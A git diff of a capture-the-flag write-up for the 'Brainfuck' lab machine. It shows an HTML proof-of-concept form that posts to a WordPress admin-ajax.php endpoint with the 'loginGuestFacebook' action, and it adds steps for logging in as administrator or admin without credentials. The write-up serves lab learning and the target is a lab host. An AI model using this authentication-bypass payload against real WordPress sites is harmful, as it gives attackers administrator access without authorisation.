@@ -372,7 +372,7 @@ Interesting Finding(s):
 
 + Generate POC modifying the domain on a HTML file:
 ```
-<form method="post" action="http://brainfuck.htb/wp-admin/admin-ajax.php">
+<form method="post" action="https://brainfuck.htb/wp-admin/admin-ajax.php">
   Username: <input type="text" name="username" value="administrator">
   <input type="hidden" name="email" value="sth">
   <input type="hidden" name="action" value="loginGuestFacebook">
@@ -381,6 +381,15 @@ Interesting Finding(s):
 ```
 ![image](https://github.com/h4md153v63n/CTFs/assets/5091265/837a52be-d8e5-4bf9-ba8a-3fe84e4873bc)
 
++ Click login button. The page is empty.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/1f4da866-bdbc-40fa-8526-04606bd85d23)
+
++ Navigate to `https://brainfuck.htb/` and refresh. Logged as administrator without authentication.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/27a66df1-dd3b-40f4-95b8-4ca18bd03537)
+
++ Change username `administrator` to `admin` on the POC.
++ Go to `https://brainfuck.htb/wp-admin/` , and redirects to admin panel without authentication.
+![image](https://github.com/h4md153v63n/CTFs/assets/5091265/ec18c42b-9394-44b3-858f-3e24464f4fda)
 
 
 
